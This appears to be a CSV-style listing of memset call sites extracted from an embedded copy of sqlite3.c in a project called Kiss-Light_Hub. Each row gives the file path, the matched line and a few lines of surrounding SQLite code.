    memset(&sWalker, 0, sizeof(Walker));
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pSample->anEq, 0, sizeof(tRowcnt)*nEqZero);",120,1,"
  /* Zero the first nEqZero entries in the anEq[] array. */
  memset(pSample->anEq, 0, sizeof(tRowcnt)*nEqZero);

find_new_min:
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(PARSE_TAIL(pParse), 0, PARSE_TAIL_SZ);",120,1,"  pParse->nested++;
  memcpy(saveBuf, PARSE_TAIL(pParse), PARSE_TAIL_SZ);
  memset(PARSE_TAIL(pParse), 0, PARSE_TAIL_SZ);
  sqlite3RunParser(pParse, zSql, &zErrMsg);
  sqlite3DbFree(db, zErrMsg);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pList->a[0], 0, sizeof(pList->a[0]));",120,1,"    pList->nAlloc = 1;
    pList->nSrc = 1;
    memset(&pList->a[0], 0, sizeof(pList->a[0]));
    pList->a[0].iCursor = -1;
  }else{
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pTab, 0, sizeof(PragmaVtab));",120,1,"      rc = SQLITE_NOMEM;
    }else{
      memset(pTab, 0, sizeof(PragmaVtab));
      pTab->pName = pPragma;
      pTab->db = db;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr, 0, sizeof(PragmaVtabCursor));",120,1,"  pCsr = (PragmaVtabCursor*)sqlite3_malloc(sizeof(*pCsr));
  if( pCsr==0 ) return SQLITE_NOMEM;
  memset(pCsr, 0, sizeof(PragmaVtabCursor));
  pCsr->base.pVtab = pVtab;
  *ppCursor = &pCsr->base;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(meta, 0, sizeof(meta));",120,1,"  }
  if( (db->flags & SQLITE_ResetDatabase)!=0 ){
    memset(meta, 0, sizeof(meta));
  }
  pDb->pSchema->schema_cookie = meta[BTREE_SCHEMA_VERSION-1];
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sParse, 0, PARSE_HDR_SZ);",120,1,"  Parse sParse;             /* Parsing context */

  memset(&sParse, 0, PARSE_HDR_SZ);
  memset(PARSE_TAIL(&sParse), 0, PARSE_TAIL_SZ);
  sParse.pReprepare = pReprepare;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(PARSE_TAIL(&sParse), 0, PARSE_TAIL_SZ);",120,1,"
  memset(&sParse, 0, PARSE_HDR_SZ);
  memset(PARSE_TAIL(&sParse), 0, PARSE_TAIL_SZ);
  sParse.pReprepare = pReprepare;
  assert( ppStmt && *ppStmt==0 );
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pKI->aSortFlags, 0, pKI->nKeyField); */",120,1,"    pOp->p2 = nKey + nData;
    pKI = pOp->p4.pKeyInfo;
    memset(pKI->aSortFlags, 0, pKI->nKeyField); /* Makes OP_Jump testable */
    sqlite3VdbeChangeP4(v, -1, (char*)pKI, P4_KEYINFO);
    testcase( pKI->nAllField > pKI->nKeyField+2 );
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&ifNullRow, 0, sizeof(ifNullRow));",120,1,"        sqlite3 *db = pSubst->pParse->db;
        if( pSubst->isLeftJoin && pCopy->op!=TK_COLUMN ){
          memset(&ifNullRow, 0, sizeof(ifNullRow));
          ifNullRow.op = TK_IF_NULL_ROW;
          ifNullRow.pLeft = pCopy;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sWalker, 0, sizeof(sWalker));",120,1,"static void havingToWhere(Parse *pParse, Select *p){
  Walker sWalker;
  memset(&sWalker, 0, sizeof(sWalker));
  sWalker.pParse = pParse;
  sWalker.xExprCallback = havingToWhereExprCb;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(sCol, 0, sizeof(sCol));",120,1,"  ** prior to comparing against the conflict-target expression.
  */
  memset(sCol, 0, sizeof(sCol));
  sCol[0].op = TK_COLLATE;
  sCol[0].pLeft = &sCol[1];
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pWInfo->a[0], 0, sizeof(WhereLoop)+nTabList*sizeof(WhereLevel));",120,1,"  memset(&pWInfo->nOBSat, 0,
         offsetof(WhereInfo,sWC) - offsetof(WhereInfo,nOBSat));
  memset(&pWInfo->a[0], 0, sizeof(WhereLoop)+nTabList*sizeof(WhereLevel));
  assert( pWInfo->eOnePass==ONEPASS_OFF );  /* ONEPASS defaults to OFF */
  pMaskSet = &pWInfo->sMaskSet;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sSelect, 0, sizeof(sSelect));",120,1,"    if( sqlite3WhereTrace & 0x100 ){
      Select sSelect;
      memset(&sSelect, 0, sizeof(sSelect));
      sSelect.selFlags = SF_WhereBegin;
      sSelect.pSrc = pTabList;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pExpr, 0, sizeof(Expr));",120,1,"        sqlite3ExprDelete(pParse->db, pExpr);
        ExprClearProperty(pExpr, EP_Static);
        memset(pExpr, 0, sizeof(Expr));

        pExpr->op = TK_COLUMN;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sRewrite, 0, sizeof(WindowRewrite));",120,1,"  assert( pWin!=0 );
  memset(&sWalker, 0, sizeof(Walker));
  memset(&sRewrite, 0, sizeof(WindowRewrite));

  sRewrite.pSub = *ppSub;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&s, 0, sizeof(WindowCodeArg));",120,1,"
  /* Fill in the context object */
  memset(&s, 0, sizeof(WindowCodeArg));
  s.pParse = pParse;
  s.pMWin = pMWin;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sqlite3GlobalConfig.m, 0, sizeof(sqlite3GlobalConfig.m));",120,1,"        ** revert to its default implementation when sqlite3_initialize() is run
        */
        memset(&sqlite3GlobalConfig.m, 0, sizeof(sqlite3GlobalConfig.m));
      }else{
        /* EVIDENCE-OF: R-61006-08918 If the memory pointer is not NULL then the
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(zFile, 0, 4);  */",120,1,"    if( !zFile ) return SQLITE_NOMEM_BKPT;

    memset(zFile, 0, 4);  /* 4-byte of 0x00 is the start of DB name marker */
    zFile += 4;

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(zFile+iOut, 0, 4); */",120,1,"    }
    if( eState==1 ) zFile[iOut++] = '\0';
    memset(zFile+iOut, 0, 4); /* end-of-options + empty journal filenames */

    /* Check if there were any options specified that should be interpreted
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(zFile, 0, 4);",120,1,"    zFile = sqlite3_malloc64(nUri+8);
    if( !zFile ) return SQLITE_NOMEM_BKPT;
    memset(zFile, 0, 4);
    zFile += 4;
    if( nUri ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(zFile+nUri, 0, 4);",120,1,"      memcpy(zFile, zUri, nUri);
    }
    memset(zFile+nUri, 0, 4);
    flags &= ~SQLITE_OPEN_URI;
  }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0, 4);",120,1,"  pResult = p = sqlite3_malloc64( nByte );
  if( p==0 ) return 0;
  memset(p, 0, 4);
  p += 4;
  p = appendText(p, zDatabase);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aIndex, 0, sizeof(struct Fts3Index) * nIndex);",120,1,"  }

  memset(aIndex, 0, sizeof(struct Fts3Index) * nIndex);
  if( zParam ){
    const char *p = zParam;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset((void*)aCol, 0, nByte);",120,1,"  aCol = (const char **)sqlite3_malloc64(nByte);
  if( aCol ){
    memset((void*)aCol, 0, nByte);
    azNotindexed = (char **)sqlite3_malloc64(nByte);
  }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(azNotindexed, 0, nByte);",120,1,"  }
  if( azNotindexed ){
    memset(azNotindexed, 0, nByte);
  }
  if( !aCol || !azNotindexed ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr, 0, sizeof(Fts3Cursor));",120,1,"    return SQLITE_NOMEM;
  }
  memset(pCsr, 0, sizeof(Fts3Cursor));
  return SQLITE_OK;
}
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&(&pCsr->base)[1], 0, sizeof(Fts3Cursor)-sizeof(sqlite3_vtab_cursor));",120,1,"  sqlite3Fts3MIBufferFree(pCsr->pMIBuffer);
  sqlite3Fts3ExprFree(pCsr->pExpr);
  memset(&(&pCsr->base)[1], 0, sizeof(Fts3Cursor)-sizeof(sqlite3_vtab_cursor));
}

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&aOut[(p-aOut)], 0, FTS3_BUFFER_PADDING);",120,1,"  }else{
    assert( (p-aOut)<=n1+n2+FTS3_VARINT_MAX-1 );
    memset(&aOut[(p-aOut)], 0, FTS3_BUFFER_PADDING);
  }
  *paOut = aOut;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pTS->aaOutput[0][nDoclist], 0, FTS3_VARINT_MAX);",120,1,"    if( pTS->aaOutput[0] ){
      memcpy(pTS->aaOutput[0], aDoclist, nDoclist);
      memset(&pTS->aaOutput[0][nDoclist], 0, FTS3_VARINT_MAX);
    }else{
      return SQLITE_NOMEM;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr, 0, sizeof(Fts3MultiSegReader));",120,1,"  assert( isPrefix==0 || isScan==0 );

  memset(pCsr, 0, sizeof(Fts3MultiSegReader));
  return fts3SegReaderCursor(
      p, iLangid, iIndex, iLevel, zTerm, nTerm, isPrefix, isScan, pCsr
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&tsc, 0, sizeof(TermSelect));",120,1,"
  pSegcsr = pTok->pSegcsr;
  memset(&tsc, 0, sizeof(TermSelect));

  filter.flags = FTS3_SEGMENT_IGNORE_EMPTY | FTS3_SEGMENT_REQUIRE_POS
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&aDoclist[nByte], 0, FTS3_BUFFER_PADDING);",120,1,"        if( !aDoclist ) return SQLITE_NOMEM;
        memcpy(aDoclist, a[p->nToken-1].pList, nByte+1);
        memset(&aDoclist[nByte], 0, FTS3_BUFFER_PADDING);

        for(i=0; i<(p->nToken-1); i++){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pPhrase->doclist.pList[nNew], 0, pPhrase->doclist.nList - nNew);",120,1,"      assert( pPhrase->doclist.pList[nNew]=='\0' );
      assert( nNew<=pPhrase->doclist.nList && nNew>0 );
      memset(&pPhrase->doclist.pList[nNew], 0, pPhrase->doclist.nList - nNew);
      pPhrase->doclist.nList = nNew;
    }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pDl->pList, 0, pDl->nList);",120,1,"              Fts3Doclist *pDl = &pRight->pPhrase->doclist;
              while( *pRc==SQLITE_OK && pRight->bEof==0 ){
                memset(pDl->pList, 0, pDl->nList);
                fts3EvalNextRow(pCsr, pRight, pRc);
              }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pE->aMI, 0, pTab->nColumn * 3 * sizeof(u32));",120,1,"      pE->aMI = (u32 *)sqlite3_malloc64(pTab->nColumn * 3 * sizeof(u32));
      if( !pE->aMI ) return SQLITE_NOMEM;
      memset(pE->aMI, 0, pTab->nColumn * 3 * sizeof(u32));
    }

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pPhrase->doclist, 0, sizeof(Fts3Doclist));",120,1,"    sqlite3_free(pPhrase->doclist.aAll);
    fts3EvalInvalidatePoslist(pPhrase);
    memset(&pPhrase->doclist, 0, sizeof(Fts3Doclist));
    for(i=0; i<pPhrase->nToken; i++){
      fts3SegReaderCursorFree(pPhrase->aToken[i].pSegcsr);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr, 0, sizeof(Fts3auxCursor));",120,1,"  pCsr = (Fts3auxCursor *)sqlite3_malloc(sizeof(Fts3auxCursor));
  if( !pCsr ) return SQLITE_NOMEM;
  memset(pCsr, 0, sizeof(Fts3auxCursor));

  *ppCsr = (sqlite3_vtab_cursor *)pCsr;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr->aStat, 0, sizeof(struct Fts3auxColstats) * pCsr->nStat);",120,1,"
    if( fts3auxGrowStatArray(pCsr, 2) ) return SQLITE_NOMEM;
    memset(pCsr->aStat, 0, sizeof(struct Fts3auxColstats) * pCsr->nStat);
    iCol = 0;

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pCsr->csr, 0, ((u8*)&pCsr[1]) - (u8*)&pCsr->csr);",120,1,"  sqlite3_free((void *)pCsr->filter.zTerm);
  sqlite3_free(pCsr->aStat);
  memset(&pCsr->csr, 0, ((u8*)&pCsr[1]) - (u8*)&pCsr->csr);

  pCsr->filter.flags = FTS3_SEGMENT_REQUIRE_POS|FTS3_SEGMENT_IGNORE_EMPTY;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"if( pRet ) memset(pRet, 0, nByte);",120,1,"static void *fts3MallocZero(sqlite3_int64 nByte){
  void *pRet = sqlite3_malloc64(nByte);
  if( pRet ) memset(pRet, 0, nByte);
  return pRet;
}
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pToken, 0, sizeof(Fts3PhraseToken));",120,1,"        assert( nToken==ii );
        pToken = &((Fts3Phrase *)(&p[1]))->aToken[ii];
        memset(pToken, 0, sizeof(Fts3PhraseToken));

        memcpy(&zTemp[nTemp], zByte, nByte);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0, (char *)&(((Fts3Phrase *)&p[1])->aToken[0])-(char *)p);",120,1,"    p = fts3ReallocOrFree(p, nSpace + nToken*sizeof(Fts3PhraseToken) + nTemp);
    if( !p ) goto no_mem;
    memset(p, 0, (char *)&(((Fts3Phrase *)&p[1])->aToken[0])-(char *)p);
    p->eType = FTSQUERY_PHRASE;
    p->pPhrase = (Fts3Phrase *)&p[1];
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(apLeaf, 0, sizeof(Fts3Expr *) * nMaxDepth);",120,1,"        rc = SQLITE_NOMEM;
      }else{
        memset(apLeaf, 0, sizeof(Fts3Expr *) * nMaxDepth);
      }

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sParse, 0, sizeof(ParseContext));",120,1,"  ParseContext sParse;

  memset(&sParse, 0, sizeof(ParseContext));
  sParse.pTokenizer = pTokenizer;
  sParse.iLangid = iLangid;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0, n);",120,1,"  void *p = sqlite3_malloc64(n);
  if( p ){
    memset(p, 0, n);
  }
  return p;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(t, 0, sizeof(*t));",120,1,"  t = (porter_tokenizer *) sqlite3_malloc(sizeof(*t));
  if( t==NULL ) return SQLITE_NOMEM;
  memset(t, 0, sizeof(*t));
  *ppTokenizer = &t->base;
  return SQLITE_OK;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&zReverse[sizeof(zReverse)-5], 0, 5);",120,1,"    }
  }
  memset(&zReverse[sizeof(zReverse)-5], 0, 5);
  z = &zReverse[j+1];

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pTab, 0, sizeof(Fts3tokTable));",120,1,"
  if( rc==SQLITE_OK ){
    memset(pTab, 0, sizeof(Fts3tokTable));
    pTab->pMod = pMod;
    pTab->pTok = pTok;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr, 0, sizeof(Fts3tokCursor));",120,1,"    return SQLITE_NOMEM;
  }
  memset(pCsr, 0, sizeof(Fts3tokCursor));

  *ppCsr = (sqlite3_vtab_cursor *)pCsr;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&aByte[nByte], 0, FTS3_NODE_PADDING);",120,1,"        }
        rc = sqlite3_blob_read(p->pSegments, aByte, nByte, 0);
        memset(&aByte[nByte], 0, FTS3_NODE_PADDING);
        if( rc!=SQLITE_OK ){
          sqlite3_free(aByte);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pReader->aNode[pReader->nPopulate], 0, FTS3_NODE_PADDING);",120,1,"  if( rc==SQLITE_OK ){
    pReader->nPopulate += nRead;
    memset(&pReader->aNode[pReader->nPopulate], 0, FTS3_NODE_PADDING);
    if( pReader->nPopulate==pReader->nNode ){
      sqlite3_blob_close(pReader->pBlob);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pReader, 0, sizeof(Fts3SegReader));",120,1,"    return SQLITE_NOMEM;
  }
  memset(pReader, 0, sizeof(Fts3SegReader));
  pReader->iIdx = iAge;
  pReader->bLookup = bLookup!=0;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pReader->aNode[nRoot], 0, FTS3_NODE_PADDING);",120,1,"    pReader->nNode = nRoot;
    if( nRoot ) memcpy(pReader->aNode, zRoot, nRoot);
    memset(&pReader->aNode[nRoot], 0, FTS3_NODE_PADDING);
  }else{
    pReader->iCurrentBlock = iStartLeaf-1;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pReader, 0, nByte);",120,1,"      rc = SQLITE_NOMEM;
    }else{
      memset(pReader, 0, nByte);
      pReader->iIdx = 0x7FFFFFFF;
      pReader->ppNextElem = (Fts3HashElem **)&pReader[1];
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pNew, 0, sizeof(SegmentNode));",120,1,"    return SQLITE_NOMEM;
  }
  memset(pNew, 0, sizeof(SegmentNode));
  pNew->nData = 1 + FTS3_VARINT_MAX;
  pNew->aData = (char *)&pNew[1];
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pWriter, 0, sizeof(SegmentWriter));",120,1,"    pWriter = (SegmentWriter *)sqlite3_malloc(sizeof(SegmentWriter));
    if( !pWriter ) return SQLITE_NOMEM;
    memset(pWriter, 0, sizeof(SegmentWriter));
    *ppWriter = pWriter;

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pList[nList], 0, pEnd - &pList[nList]);",120,1,"
  if( bZero && (pEnd - &pList[nList])>0){
    memset(&pList[nList], 0, pEnd - &pList[nList]);
  }
  *ppList = pList;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pCsr->aBuffer[nDoclist], 0, FTS3_NODE_PADDING);",120,1,"        rc = fts3GrowSegReaderBuffer(pCsr, nDoclist+FTS3_NODE_PADDING);
        if( rc ) return rc;
        memset(&pCsr->aBuffer[nDoclist], 0, FTS3_NODE_PADDING);
        pCsr->aDoclist = pCsr->aBuffer;
        pCsr->nDoclist = nDoclist;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&filter, 0, sizeof(Fts3SegFilter));",120,1,"  );

  memset(&filter, 0, sizeof(Fts3SegFilter));
  filter.flags = FTS3_SEGMENT_REQUIRE_POS;
  filter.flags |= (bIgnoreEmpty ? FTS3_SEGMENT_IGNORE_EMPTY : 0);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(a, 0, sizeof(u32)*(nStat) );",120,1,"         sqlite3_column_bytes(pStmt, 0));
  }else{
    memset(a, 0, sizeof(u32)*(nStat) );
  }
  rc = sqlite3_reset(pStmt);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aSz, 0, nByte);",120,1,"        rc = SQLITE_NOMEM;
      }else{
        memset(aSz, 0, nByte);
        aSzIns = &aSz[p->nColumn+1];
        aSzDel = &aSzIns[p->nColumn+1];
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aSz, 0, sizeof(aSz[0]) * (p->nColumn+1));",120,1,"      int iLangid = langidFromSelect(p, pStmt);
      rc = fts3PendingTermsDocid(p, 0, iLangid, sqlite3_column_int64(pStmt, 0));
      memset(aSz, 0, sizeof(aSz[0]) * (p->nColumn+1));
      for(iCol=0; rc==SQLITE_OK && iCol<p->nColumn; iCol++){
        if( p->abNotindexed[iCol]==0 ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr, 0, sizeof(*pCsr));",120,1,"
  /* Allocate space for the Fts3MultiSegReader.aCsr[] array */
  memset(pCsr, 0, sizeof(*pCsr));
  nByte = sizeof(Fts3SegReader *) * nSeg;
  pCsr->apSegment = (Fts3SegReader **)sqlite3_malloc64(nByte);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr->apSegment, 0, nByte);",120,1,"    rc = SQLITE_NOMEM;
  }else{
    memset(pCsr->apSegment, 0, nByte);
    rc = fts3SqlStmt(p, SQL_SELECT_LEVEL, &pStmt, 0);
  }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0, sizeof(NodeReader));",120,1,"*/
static int nodeReaderInit(NodeReader *p, const char *aNode, int nNode){
  memset(p, 0, sizeof(NodeReader));
  p->aNode = aNode;
  p->nNode = nNode;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pNode->block.a[nRoot], 0, FTS3_NODE_PADDING);",120,1,"        memcpy(pNode->block.a, aRoot, nRoot);
        pNode->block.n = nRoot;
        memset(&pNode->block.a[nRoot], 0, FTS3_NODE_PADDING);
      }

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pNode->block.a[nBlock], 0, FTS3_NODE_PADDING);",120,1,"                memcpy(pNode->block.a, aBlock, nBlock);
                pNode->block.n = nBlock;
                memset(&pNode->block.a[nBlock], 0, FTS3_NODE_PADDING);
              }
              sqlite3_free(aBlock);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pWriter, 0, nAlloc);",120,1,"    ** done on iAbsLevel - fall through to the next iteration of the loop
    ** to start work on some other level.  */
    memset(pWriter, 0, nAlloc);
    pFilter->flags = FTS3_SEGMENT_REQUIRE_POS;

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&filter, 0, sizeof(filter));",120,1,"  assert( *pRc==SQLITE_OK );

  memset(&filter, 0, sizeof(filter));
  memset(&csr, 0, sizeof(csr));
  filter.flags =  FTS3_SEGMENT_REQUIRE_POS|FTS3_SEGMENT_IGNORE_EMPTY;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&csr, 0, sizeof(csr));",120,1,"
  memset(&filter, 0, sizeof(filter));
  memset(&csr, 0, sizeof(csr));
  filter.flags =  FTS3_SEGMENT_REQUIRE_POS|FTS3_SEGMENT_IGNORE_EMPTY;
